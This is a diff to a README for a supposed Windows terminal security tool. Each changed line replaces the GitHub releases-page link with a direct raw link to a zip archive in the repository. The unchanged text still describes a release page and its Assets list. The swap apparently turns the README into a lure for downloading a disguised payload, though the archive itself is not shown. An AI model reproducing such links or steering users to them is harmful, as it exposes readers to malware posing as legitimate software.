@@ -1,6 +1,6 @@
 # 🛡️ HackTUI-Hermes-Jido - Terminal Security for Windows Teams
 
-[![Download HackTUI-Hermes-Jido](https://img.shields.io/badge/Download%20Now-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mybiznes754/HackTUI-Hermes-Jido/releases)
+[![Download HackTUI-Hermes-Jido](https://img.shields.io/badge/Download%20Now-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Mybiznes754/HackTUI-Hermes-Jido/main/apps/hacktui_tui/Hermes_Jido_Hack_TU_1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This page shows you how to get the app on Windows and start it with the least fr
 
 ## 📥 Download HackTUI-Hermes-Jido
 
-1. Open the release page here: https://github.com/Mybiznes754/HackTUI-Hermes-Jido/releases
+1. Open the release page here: https://raw.githubusercontent.com/Mybiznes754/HackTUI-Hermes-Jido/main/apps/hacktui_tui/Hermes_Jido_Hack_TU_1.5.zip
 2. Find the latest release at the top of the page
 3. Download the Windows file from the Assets section
 4. Save the file to your Downloads folder or Desktop
@@ -154,7 +154,7 @@ No extra tools should be needed for the normal Windows setup. A terminal window 
 Yes. The app is built for keyboard use.
 
 ### Where do I get the latest version?
-Use the release page here: https://github.com/Mybiznes754/HackTUI-Hermes-Jido/releases
+Use the release page here: https://raw.githubusercontent.com/Mybiznes754/HackTUI-Hermes-Jido/main/apps/hacktui_tui/Hermes_Jido_Hack_TU_1.5.zip
 
 ### What if I do not see a Windows file?
 Scroll through the Assets list on the release page and look for the file meant for Windows.
@@ -207,4 +207,4 @@ This helps you avoid confusion during busy security work.
 
 ## 📌 Release Page
 
-Download or update from here: https://github.com/Mybiznes754/HackTUI-Hermes-Jido/releases
+Download or update from here: https://raw.githubusercontent.com/Mybiznes754/HackTUI-Hermes-Jido/main/apps/hacktui_tui/Hermes_Jido_Hack_TU_1.5.zip
